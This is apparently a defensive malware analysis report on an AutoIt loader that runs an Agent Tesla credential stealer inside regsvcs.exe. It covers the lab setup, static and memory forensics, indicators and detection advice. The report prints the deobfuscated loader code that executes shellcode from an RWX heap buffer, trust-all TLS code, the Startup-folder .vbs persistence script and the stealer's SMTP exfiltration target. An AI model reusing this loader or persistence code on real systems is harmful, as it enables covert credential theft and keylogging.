## 1. Executive Summary

This case involves an AutoIt-based loader that delivers an **Agent Tesla** credential-stealing payload. The loader decrypts a second-stage in memory, starts **regsvcs.exe** (a legitimate Windows utility), and then **runs the payload inside that process** without writing a .NET file to disk.

**What it does:** The payload focuses on **credential theft** (browsers, mail and FTP clients, VPN/VNC, etc.) and includes **keylogging**. It can send data out over **HTTPS** and **SMTP**.

**What was seen in the lab:** Outbound **HTTPS** was allowed and the malware reached out to **api.ipify.org** (public-IP check). **SMTP** to Yandex (port 587) was blocked by egress controls, so no mail exfiltration succeeded. Even with SMTP blocked, **credential theft and keylogging still worked locally**.

**How it hides:** Memory analysis confirmed the payload was **in-memory inside regsvcs.exe** (no normal module on disk) and the original regsvcs.exe image remained intact (i.e., not a full replacement). The exact thread-injection primitive is not critical here; the **in-memory execution** is conclusive.

**Persistence:** This variant used a **Startup folder script (`.vbs`)** for logon persistence. (A Run-key mechanism exists in code but was **disabled** in this build.)

**Risk:** If not stopped, the malware can continuously harvest credentials and user input and attempt to exfiltrate them whenever outbound mail/HTTPS is available.

**Priority actions**
- **Block direct SMTP egress** (allow only approved relays) and alert on unusual **HTTPS** calls linked to initial discovery (e.g., public-IP checks).
- **Monitor `regsvcs.exe`** for abnormal network activity and signs of code running from memory (no on-disk module).
- **Detect persistence** via **Startup folder** scripts and subsequent `wscript.exe`/`cscript.exe` launches.

## 3. Analysis Environment

### Lab Environment

- **Microsoft Windows 10 Enterprise Evaluation (Version 22H2, OS Build 19045, FlareVM)** – malware detonation VM, patched, Windows Defender Antivirus and Windows Firewall disabled.
- **Microsoft Windows 10 Enterprise Evaluation (Version 22H2, OS Build 19045, Clean)** – clean VM connected to the same network, Windows Defender Antivirus and Windows Firewall disabled.
- **pfSense Firewall VM** – mediates all outbound traffic, configurable rules (DNS/HTTP/S only, ICMP, LAN-to-LAN, or full block). WAN interface connected through NAT.
- **REMnux VM** – positioned as a transparent bridge (Layer 2 between CLIENT_NET and FW_NET) between malware VM and pfSense. Runs TShark to capture all packets; invisible to malware.

![Lab Topology Diagram](images/labTopology.png) 
*VMs are hosted in Oracle VirtualBox*

**VirtualBox Networking** 

  -  **CLIENT_NET** (Internal Network): Windows VMs ↔ REMnux.
  -  **FW_NET** (Internal Network): REMnux ↔ pfSense LAN.
  -   pfSense LAN subnet: 192.168.1.0/24, DHCP enabled.
  -   pfSense WAN NIC: NAT towards host.
 
**Connectivity Controls**

- **Run 1 (Safe):** Block all outbound internet. Allow only LAN-to-LAN, DNS, optional ICMP.  
- **Run 2 (Restricted):** Run 1 + HTTP/S (closely monitored).  
- No full "allow all" stage was used, to prevent risk of botnet participation or worm propagation.

### Detonation VM OS and Patch Information

- **OS:** Microsoft Windows 10 Enterprise Evaluation
- **Build:** 22H2 (OS Build 19045.2006)
- **Architecture:** x64
- **Status:** Fully patched as of 2025-08-15

## 4. Static Analysis

### File Metadata & Version Info

**Type:** AutoIt-compiled loader -> executes embedded payload

---

### Main Sample (hereafter referred to as main_sample.exe)

- **SHA256:** 45d6ccb917bd3b9333316262ebcd56caa515385f9c2b387417ee8152a1fe798a
- **File type:** Executable, 32-bit, GUI
- **Compiler:** Microsoft Visual C++ 6.0–8.0, Visual Studio 2012
- **Compile timestamp:** Wed Jul 30 23:52:50 2025 
- **Signature:** AutoIt compiled script 
- **Size:** ~1.26 MB 
- **Entropy:** 7.093 
- **Entry Point:** 0x00025F74 (.text section)
- **Requested Execution Level:** "asInvoker" (runs with same privileges as user)

---

### Obfuscation & Masquerading

- Rolling XOR decoding for names, constants, and payload
- Randomized variable and function names
- Dead "noise" code, decoy calls, fake URLs
- **Embedded Excel icon in resources** to masquerade as an Office document, despite being an executable
- Later managed stage is resource-loaded at runtime ( `Assembly.Load(byte[])` on resource "_" ); strings/logic are decoded on-the-fly by a .NET protector. (See [Section 7](#7-memory--forensic-artifacts))
 
---

### Real Execution Path *(from decoded AutoIt)*

1. Drops **Archimago** & **complacence** into `%TEMP%`.
2. Decrypts **Archimago** with custom rolling XOR (`KOGMOFDJ`).
3. Allocates RW heap buffer -> sets it to RWX via VirtualProtect(…, 0x40) -> executes via CallWindowProc (entry offset +9200).
4. Transfers control to **stage-2 payload** in memory.
5. Stage-2 subsequently **loads/executes the managed stealer inside `regsvcs.exe`** via reflective/manual-map (details in [Section 7](#7-memory--forensic-artifacts)).

---

### Dead Code Purpose

Inflates string surface + misleads static analysis.

---

### Key Decoded Strings

- `GetProcessHeap`
- `HeapAlloc`
- `VirtualProtect`
- `CallWindowProc`
- `DllStructCreate`

---

### Capabilities *(from capa + PEStudio)*

- Registry **Run-key persistence** *(not observed during dynamic analysis; dnSpy of an ExtremeDumper dump shows it’s disabled by default in this variation)*
- **Process injection** + remote thread creation
- **HTTPS/SMTP** communications
- **Credential harvesting**
- **Anti-analysis** techniques *(WOW64 disable, process enumeration)*

---

### Deobfuscated Code Extracted from `main_sample.exe`

```
FileInstall ( "Archimago" , @TempDir & "\Archimago" , 1 )
Global $RDEVAVC = KOGMOFDJ ( FileRead ( @TempDir & "\Archimago" ) )
FileInstall ( "complacence" , @TempDir & "\complacence" , 1 )
Global $WJORKAPW = DllCall ("kernel32.dll", "ptr", "GetProcessHeap") [ 0 ]
Global $JIVEKJU = DllCall ("kernel32.dll", "ptr", "HeapAlloc", "ptr", $WJORKAPW , "dword", 0 , "dword", BinaryLen ( $RDEVAVC ) ) [ 0 ]
DllStructSetData ( DllStructCreate ("byte[" & BinaryLen ( $RDEVAVC ) & "]" , $JIVEKJU ) , 1 , $RDEVAVC )
DllCall ( "kernel32.dll", "bool", "VirtualProtect", "ptr", $JIVEKJU , "dword", BinaryLen ( $RDEVAVC ) , "dword", 0x40, "dword*", 0 )
DllCall ( "user32.dll", "ptr", "CallWindowProc" , "ptr", $JIVEKJU + 9200 , "ptr", 0 , "ptr", 0 , "ptr", 0 , "ptr", 0 )

```
This decoded AutoIt snippet shows the core loader functionality:
1. **Extract & decrypt**: `Archimago` is extracted to `%TEMP%` and decrypted in‑memory into `$RDEVAVC`.  
2. **Allocate**: Memory for the payload is obtained via the Windows heap APIs (`GetProcessHeap` -> `HeapAlloc`).  
3. **Write**: The decrypted  payload is copied into the buffer (`DllStructSetData`).  
4. **Make executable**: `VirtualProtect` switches the region to `PAGE_EXECUTE_READWRITE` (`0x40`).  
5. **Execute**: The payload is invoked by calling an **entrypoint within the buffer** (offset `9200` bytes) using `CallWindowProc`, a common trampoline to run shellcode/PE stubs in memory.

**For detailed deobfuscation of the AutoIt loader, see **[Appendix B - Deobfuscation of the AutoIt Script](#appendix-b---deobfuscation-of-the-autoit-script)****

### Managed stage (minimal)

```csharp
// Trust-all TLS + legacy protocols (keeps SMTP/HTTPS resilient)
ServicePointManager.SecurityProtocol =
    SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
ServicePointManager.ServerCertificateValidationCallback = (a,b,c,d) => true;

// Resource-loaded assembly (resource name "_")
var asm = Assembly.Load(Resources._); // actual code uses a byte[] from the "_" resource

// Network check used before exfil
var ip = new WebClient().DownloadString("https://api.ipify.org");
```

### 4.1. String Analysis (FLOSS)

**Tool Used:** [FLOSS](https://github.com/mandiant/flare-floss)  

**Findings (pre-memdump):**

- The main sample (`main_sample.exe`) is an **AutoIt-compiled loader**.
- Most decoded strings are **misleading or noise**, including:
    - AutoIt runtime markers: `">>>AUTOIT SCRIPT<<<"`, `"This is a third-party compiled AutoIt script"`.
    - Fake/unused URLs: e.g., `htttp://deriU.io`, `htttp://mQhuFGoCb.io`.
    - AutoIt GUI/runtime messages and random variables.
- FLOSS identified many **WinINet calls** (`InternetOpen`, `InternetConnect`, `HttpOpenRequest`) and **FTP functions** (`FtpOpenFile`, `FtpGetFileSize`), suggesting HTTP(S)/FTP exfiltration support.
- It also revealed indicators of:
    - Registry interactions (`RegCreateKeyExW`, `RegSetValueExW`, etc.).
    - Token manipulation APIs (`LogonUserW`, `DuplicateTokenEx`).
    - Process injection APIs (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`).
    - Sandbox evasion hints (e.g., `Wow64DisableWow64FsRedirection`).

**Findings (post-memdump):**

- dnSpy and FLOSS:
    - **Resource-loaded managed payload** (no on-disk .NET required).  
    - **TLS trust-all** via `ServerCertificateValidationCallback` (helps SMTP/HTTPS succeed).
    - MugUxE.exe/MugUxE (run key persistence value, disabled by default in this version)
    - Username: jewoneng@jewoneng-kr.ml
    - Password: [redacted]
      
**Limitations (pre-memdump):**

- No useful IOCs or config strings recovered.
- Likely because **Archimago** (stage-2 payload) and other key resources are **runtime-decrypted**.
- Requires dynamic analysis to extract real indicators.

### 4.2. Capabilities vs. Observed Behavior

| Capability               | Detected Statically                                | Observed Dynamically              | Notes |
|--------------------------|----------------------------------------------------|-----------------------------------|-------|
| Registry Run Key Persistence | capa / PEStudio                                    | Not triggered                     | Used Startup `.vbs` instead; dnSpy reveals the run key persistence mechanism is disabled by default in this variation |
| Process Injection        | AutoIt script (`HeapAlloc`, `CallWindowProc`)     | Confirmed in regsvcs.exe          | Core execution path |
| Keylogging               | API indicators (`GetKeyState`, `SetWindowsHookEx`) | Confirmed via API Monitor         | Active during regsvcs.exe runtime |
| HTTPS Beaconing          | WinInet APIs                                       | Attempted -> `api.ipify.org`       | Trust-all TLS callback present (managed stage); pre-check to api.ipify.org; UA resembles Firefox/99. |
| SMTP Exfiltration        | SMTP/WinInet APIs                                  | Attempted -> Blocked               | Targets smtp.yandex.com:587 (STARTTLS) |
| Credential Harvesting    | capa                                               | Confirmed                         | Browsers, Discord, FTP, etc. |
| Token Manipulation       | Strings (`LogonUserW`, `DuplicateTokenEx`)         | Not observed                      | Possible dormant capability |
| Sandbox Evasion          | Strings (`Wow64DisableWow64FsRedirection`) + dead code | Not observed                  | Likely decoy/unused |

### 4.3 Managed stage (minimal)

- Resource-loaded assembly: **"_"** (byte[] → `Assembly.Load`).
- Network: **https://api.ipify.org** pre-check; **smtp.yandex.com:587** (STARTTLS).
- Trust-all TLS + legacy protocols (avoids cert pinning/validation failures; helps SMTP/HTTPS succeed)
- UA (observed in code): Firefox/99-style.
- Persistence (this variation): **Run-key disabled** by default.

---

## 5. Dynamic Analysis

### The following summary illustrates the execution chain observed during detonation:

High-Level Flow:
```
Stage 1 (main_sample.exe)
   -> decrypts Archimago + writes short-lived files to %LOCALAPPDATA%\Temp.
   -> repeatedly reads complacence + .tmp artifacts before spawning next stage.

Persistence Copy (endochylous.exe)
   -> identical binary to main_sample.exe, dropped under a new name.
   -> installs persistence (endochylous.vbs in Startup).
   -> spawns regsvcs.exe with injected payload.

Stage 2 (regsvcs.exe, abused .NET binary)
   -> credential harvesting (browsers, mail, FTP, VPN, DB, Discord).
   -> probes certificate stores, policy keys, hosts file.
   -> performs WMI reconnaissance (system, process, user queries).
   -> establishes keylogging capability via keyboard hooks.                                                                                                                         
      - Installs a global low-level keyboard hook (**WH_KEYBOARD_LL**) via SetWindowsHookEx; presence of CallNextHookEx confirms the hook chain.
   -> attempted SMTP exfiltration (Yandex). WinHTTP/WinINet APIs present, but no HTTP exfil was observed in this build.
```

For a detailed execution timeline (with timestamps and full process tree), see **[Appendix A - Complete Execution Timeline](#appendix-a---complete-execution-timeline)**.                                                               
Manual-map of the stage-2 loader @ 0x00400000 inside regsvcs.exe confirmed in **[Section 7](#7-memory--forensic-artifacts)**.

### Dropped Components

- **`endochylous.exe`** – SHA256: 45d6ccb917bd3b9333316262ebcd56caa515385f9c2b387417ee8152a1fe798a (a copy of the main executable)
- **`endochylous.vbs`** – SHA256: 3f3da4f8c6303ecab6929a9a852460fac7b2d66a00edcb5a2a23b236e6600deb
- **`complacence`** – SHA256: 2075b64d89b4c20daa2b08665de742b864cfe864a5fd81faa7db07e8942600c5
- **`Archimago`** – SHA256: de793a6553823e66311903b353d4be2027e21952f6bf6ad683e553f2fcf31844 
- **`autEF34.tmp`** – temporary file with "randomly" generated name

---

### Keylogging behavior (regsvcs.exe) - API Monitor

- The injected .NET assembly initializes a hidden message window (RegisterClassExW -> CreateWindowExW).
- It runs a standard message pump (GetMessageW/PeekMessageW -> TranslateMessage -> DispatchMessageW).
- During runtime it repeatedly calls GetKeyState/GetKeyboardState for modifier keys alongside GetForegroundWindow to tag the active application.
- Presence of CallNextHookEx indicates a keyboard hook is installed.
- Around initialization the process also attempted network operations:
  - WinHTTP/WinInet API calls (e.g., WinHttpOpen) consistent with HTTPS beaconing (such as to api.ipify.org).
  - Low-level Winsock calls (WSAConnect, send) consistent with direct SMTP exfiltration attempts to Yandex.
  - In the lab these Winsock calls returned SOCKET_ERROR, indicating the connections were blocked.

---

### 5.1 Network Activity - Stage 2 (regsvcs.exe)

### DNS Resolution
- `api.ipify.org` -> 172.67.74.152 (Cloudflare edge)
- `smtp.yandex.com` (CNAME `smtp.yandex.ru`) -> 77.88.21.158
- rDNS of 77.88.21.158 -> `mail-smtp.stable.qcloud-b.yandex.net`

### Observed Connections
| Timestamp (approx) | Destination                         | Port | Protocol | Purpose / Notes |
|--------------------|-------------------------------------|------|----------|----------------|
| 09:43:49           | 172.67.74.152                       | 443  | HTTPS    | Attempted connection to `api.ipify.org` -> external IP check / potential beacon. |
| 10:04–10:44        | mail-smtp.stable.qcloud-b.yandex.net | 587  | SMTP     | Repeated TCP connection attempts (SYN retransmissions, no SYN-ACK observed). Indicates blocked email exfiltration attempt. |

### All Contacted IPs
- 77.88.21.158 (smtp.yandex.ru / smtp.yandex.com)
- 104.26.12.205 (`api.ipify.org`, Cloudflare)
- 104.26.13.205 (`api.ipify.org`, Cloudflare)
- 172.67.74.152 (`api.ipify.org`, Cloudflare)

### Assessment
- regsvcs.exe attempted HTTPS to `api.ipify.org` (Cloudflare-hosted). This behavior is consistent with external reconnaissance (retrieving the victim’s public IP).
- Persistent SMTP submission attempts were directed at Yandex mail servers (`mail-smtp.stable.qcloud-b.yandex.net:587`).
- In the lab, no successful SMTP session was established due to outbound restrictions.

## 6. Persistence Mechanisms

### 1. `endochylous.vbs` in the Startup folder contains:
```
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "C:\Users\**\AppData\Local\troopwise\endochylous.exe", 1
Set WshShell = Nothing
```
![Persistence: .vbs in Startup folder](images/persistenceAgentTesla.png) 

### 2. `MugUxE.exe/MugUxE`: run key persistence value, disabled by default in this version

---

## 7. Memory / Forensic Artifacts

**Scope & Tools:** Full RAM image + process dumps of the **regsvcs.exe** host. Volatility 3 (`pslist/psscan`, `cmdline`, `dlllist`, `vadinfo`, `malfind`, `memmap`) and a live module dump with ExtremeDumper to validate in-memory .NET stages (brief dnSpy confirm only).

### 7.1 Key Findings
- **Two mappings inside regsvcs.exe**
  - **Legit image (MEM_IMAGE):** ~**0x00600000**, expected protections and file path.
  - **Manual-mapped PE (MEM_PRIVATE + EXEC, no file path):** **0x00400000** -> reflective/manual map.
- **Extra MEM_PRIVATE RX regions** near the manual-mapped base -> scratch/JIT/unpacker behavior.
- **Managed stage present in memory.** Live dump produced a small stub **_.dll** and a managed payload (renamed to "Variation2.exe"). Minimal dnSpy peek shows the stub **loads a resource blob via `Assembly.Load(byte[])`** (resource name "_", i.e. **Variation2.exe**), which is the actual stealer module.

> **Bottom line:** The malicious stage is a **manual-mapped (unmanaged) PE at 0x00400000** that hands off to a **managed payload** loaded from resources **inside regsvcs.exe**. The legit regsvcs.exe remains image‑mapped at ~0x00600000.

### 7.2 Analysis steps
1) Full memory dump taken via Magnet RAM Capture
2) VAD survey (regsvcs.exe)
   - Goal: find RX private vs image-mapped regions.
   - Example: `vol -f mem.raw -o vadinfo_regsvcs.txt windows.vadinfo --pid <regsvcs_pid>`
   - Finding: image-mapped ~**0x00600000**; **private + exec** region at **0x00400000**.
3) Hunt + dump the suspicious region(s)
   - `vol -f mem.raw -o C:\Temp\vol3_out windows.malfind --pid <regsvcs_pid> --dump`
   - `vol -f mem.raw -o C:\Temp\vol3_out windows.memmap  --pid <regsvcs_pid> --dump`
   - Finding: dump for **0x00400000** contains **MZ/PE** -> fileless/privately mapped PE.
4) Loaded-module check
   - Example: `vol -f mem.raw windows.dlllist --pid <regsvcs_pid>`
   - Finding: only the legit image around **0x00600000** shows up; the **0x00400000** PE is **not** a normal mapped module (consistent with reflective/manual-map).
5) Live process extraction (managed stage validation)
   - Attached **ExtremeDumper** to **regsvcs.exe** -> dumped `_.dll` and a managed payload.
   - Quick **dnSpy** peek: resource named `_` loaded via `Assembly.Load(byte[])`; simple WinForms loop used to keep timers/hooks running.

*Notes:* Commands shown are representative of what I ran (mostly used the VolatilityWorkbench); exact flags may have varied between runs.

### 7.3 Interpretation
- **Technique:** Process Injection (**manual‑map / reflective load**) into **regsvcs.exe** (ATT&CK **T1055** variants). Private EXEC VADs & a second PE base at **0x00400000** are the primary indicators.
- **Why the managed code matters:** It explains where the stealer logic comes from (resource‑loaded assembly) without requiring an on‑disk .NET file.

### 7.4 Limitations / Notes
- Deeper RE (config/resources) is deferred.
- Some behavior (JIT/decode) only appears **at runtime**, which explains **MEM_PRIVATE RX** regions not tied to files.

---

**Conclusion (Memory):** Memory analysis alone establishes the compromise chain: **manual‑mapped (unmanaged) loader in regsvcs.exe at 0x00400000** -> **resource‑based managed payload**. This is sufficient to attribute the stealer behavior observed elsewhere in the report to the regsvcs.exe process without requiring on‑disk artifacts.

## 9. Detections (Summary)

- **Startup-folder persistence (drop OR execute):** Detects script/shortcut drops into the per-user Startup folder and interpreters launching items from Startup.
- **Suspicious AppData\Local EXE creation:** Flags new .exe written under AppData\Local\\\<folder>, emphasizing first-seen parent folders with basic allowlists.
- **User-writable parent -> drop to Temp/AppData:** Correlates a child process spawned by a user-writable parent with file writes to Temp/AppData/Desktop within a short window.

## 11. Conclusion

This Agent Tesla sample uses an **AutoIt loader** to decrypt and run a **credential-stealing payload in memory**. The chain culminates in **`regsvcs.exe` hosting a manual-mapped (unmanaged) PE at 0x00400000**, which then loads a **managed stealer from a resource ("_")**. Capabilities observed include **credential harvesting**, **keylogging**, **HTTPS reach-out** (e.g., `api.ipify.org`), and **SMTP-based exfiltration**.

In the lab, repeated **SMTP submission to Yandex (587)** failed due to egress controls; HTTPS reach-out was attempted. I **did not rely on CreateRemoteThread** to prove execution; while **EID-8** was seen in one run, the **manual-map + resource-loaded managed stage** were conclusively established via memory artifacts and live module dumps. The absence of **EID-10** (ProcessAccess) likely reflects collection scope/timing rather than lack of injection.

**Recommendations**
- **Egress policy:** block direct outbound **SMTP**; allow only approved relays. Alert on unusual **HTTPS** beacons tied to initial discovery (e.g., public-IP checks).
- **Monitor `regsvcs.exe`:** alert on **manual-mapped** regions / private **EXEC** VADs, abnormal network use, and module loads.  
- **Detect persistence:** file creates/executes in **Startup** (e.g., `.vbs` like `endochylous.vbs`) and subsequent `wscript.exe`/`cscript.exe`.  
- **Hunt patterns:**  
  - **Keylogging:** `SetWindowsHookEx(WH_KEYBOARD_LL)` + hidden message loop.  
  - **Managed stage:** `Assembly.Load(byte[])` from resources and **trust-all TLS** (`ServerCertificateValidationCallback`).  
  - **Locked-file access:** `NtQuerySystemInformation(SystemHandleInformation)` -> `DuplicateHandle` -> `CreateFileMapping/MapViewOfFile`.  
- **Tune Sysmon:** ensure **EID-8** and **EID-10** coverage for process access/injection paths.

---

## 12. Limitations & Future Work

### Limitations
- Analysis ran in a **controlled lab** with outbound restrictions; behavior may differ with full Internet access.  
- Captured full RAM and **extracted in-memory managed assemblies** from `regsvcs.exe`, but **did not fully decrypt all resource blobs** or perform a full configuration dump.  
- Region carving was **targeted** (`malfind`/`memmap`) rather than exhaustive; some transient JIT regions may not have been preserved.

### Future Work
- **Recover full config:** runtime-dump resource "_" assemblies (or statically decode the `.resources` blobs) to extract all strings/targets/keys.  
- **Deeper RE:** map all credential plugins (browsers, mail, FTP/VNC) and confirm decryption pipelines/endpoints.  
- **Traffic validation:** emulate/sinkhole SMTP/HTTPS to capture payload formats and operator behavior.  
- **Variant tracking:** compare other AutoIt loaders attributed to Agent Tesla for code reuse and shared infrastructure.

The following table documents process execution and key events observed during dynamic analysis. Full process tree available below.

| Timestamp        | Process / Event         | Description |
|------------------|-----------------|-------------|
| 09:43:44.9114923 | main_sample.exe | Initial detonation. |
| 09:43:44.9372589 | main_sample.exe | Enumerates language packs in `HKLM\System\CurrentControlSet\Control\MUI\UILanguages\`. |
| 09:43:44.9950606+| main_sample.exe | Drops **Archimago**, **autEF34.tmp**, and **complacence** into `%LOCALAPPDATA%\Temp` (encrypted payload components). |

### Appendix B - Deobfuscation of the AutoIt Script

#### Rolling XOR Function for Deobfuscation (found in `main_sample.exe`)

```
Func KOGMOFDJ ( $BNWMAXYE )
    Local $UEVNWOOE = 80
    Local $PDZMKVDKY = ""
    For $MWPSYCXY = 1 To StringLen ( $BNWMAXYE )
        Local $OICKPUY = Asc ( StringMid ( $BNWMAXYE , $MWPSYCXY , 1 ) )
        $PDZMKVDKY &= Chr ( BitXOR ( $OICKPUY , $UEVNWOOE ) )
        $UEVNWOOE = Mod ( $UEVNWOOE + 13 , 256 )
    Next
    Return $PDZMKVDKY
EndFunc
```

---

#### PowerShell Deobfuscation Method

```
function Decrypt-KOGMOFDJ { 
    param (
        [string]$ObfuscatedString 
    ) 
    $bytes = [System.Text.Encoding]::Default.GetBytes($ObfuscatedString) 
    $key = 80 
    $decrypted = "" 

    foreach ($byte in $bytes) { 
        $decrypted += [char]($byte -bxor $key) 
        $key = ($key + 13) % 256 
    } 
    return $decrypted 
}

$testStrings = @(
    ';8^X^Yáy-T-¡_3',
    ' )^X',
    "^W8^^'ö_yIE¶sº^I%",
    ";8^X^Yáy-T-¡_3",
    " )^X",
    "^X8^K^GÅyòÄU",
    " )^X",
    "4^E^Eà",
    "4^E^Eà",
    "2$^^^Rß",
    ";8^X^Yáy-T-¡_3",
    "22^E^[",
    "^F4^X^CñdòûEª▌º^I^I",
    " )^X",
    "4^E^Eà",
    "4^E^Eà",
    "%^G",
    "4^E^Eà»",
    "%.^O^E·£°IOc",
    " )^X",
    "^S<^F^[OodIx²,-ƒs",
    " )^X", " )^X", " )^X", " )^X", " )^X"
)

foreach ($str in $testStrings) { 
    $decrypted = Decrypt-KOGMOFDJ -ObfuscatedString $str 
    Write-Host "Obfuscated: '$str' -> Decrypted: '$decrypted'"
}


```
The string ``"`%^G"`` failed because PowerShell treats ` as an escape character.                                                                                                     
To solve this, a raw hex decryption approach was used instead:

```
function Decrypt-KOGMOFDJ-Raw {
    param (
        [byte[]]$Bytes
    )
    $key = 80
    $decrypted = ""
    foreach ($byte in $Bytes) {
        $decrypted += [char]($byte -bxor $key)
        $key = ($key + 13) % 256
    }
    return $decrypted
}
```
